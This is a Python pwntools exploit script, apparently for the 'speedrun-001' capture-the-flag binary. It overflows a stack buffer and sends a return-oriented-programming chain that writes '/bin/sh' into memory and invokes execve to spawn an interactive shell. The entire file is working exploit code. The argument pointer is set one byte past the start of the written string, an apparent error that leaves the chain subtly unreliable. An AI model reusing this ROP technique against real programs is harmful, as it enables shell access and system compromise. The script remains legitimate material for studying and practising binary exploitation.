#!/usr/bin/python3
import pwn
import sys
binary = "./speedrun-001"
pwn.context.binary = binary
pwn.context.encoding = "latin"

gdbscript = ""
with open("breakpoints.gdb", "r") as io:
    gdbscript = io.read()

padding = 1032
gadgets = {
    "pop_rdi_ret":0x400686,
    "pop_rax_ret":0x415664,
    "pop_rdx_ret":0x44be16,
    "pop_rsi_ret":0x4101f3,
    "mov_qword_ptr_rax_rdx":0x48d251,
    "syscall_ret":0x474e65,
    "data_section":0x6b90e0,
    "data_section_1":0x6b90e1
}
payload = b"A"*padding
payload = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["pop_rax_ret"]),
    pwn.p64(gadgets["data_section"]),
    pwn.p64(gadgets["pop_rdx_ret"]),
    0x0068732f6e69622f,
    pwn.p64(gadgets["mov_qword_ptr_rax_rdx"]),
    pwn.p64(gadgets["pop_rax_ret"]),
    0x3b,
    pwn.p64(gadgets["pop_rdi_ret"]),
    pwn.p64(gadgets["data_section_1"]),
    pwn.p64(gadgets["pop_rsi_ret"]),
    0,
    pwn.p64(gadgets["pop_rdx_ret"]),
    0,
    pwn.p64(gadgets["syscall_ret"])
)

with pwn.gdb.debug(binary, gdbscript=gdbscript) as io:
    io.send(payload)
    io.interactive()